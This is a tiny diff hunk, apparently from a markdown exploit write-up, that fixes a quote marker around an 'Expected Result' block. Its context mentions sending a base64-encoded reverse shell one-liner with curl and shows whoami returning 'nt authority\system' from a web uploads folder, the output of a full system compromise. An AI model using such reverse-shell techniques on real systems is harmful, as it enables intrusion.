@@ -101,7 +101,7 @@ Using curl to send the base64 encoded reverse shell oneliner
 >
 >PS C:\xampp\htdocs\meteor\uploads> whoami
 >
->># ========== Expected Result ==========
+># ========== Expected Result ==========
 >nt authority\system
 ># =====================================
 >```
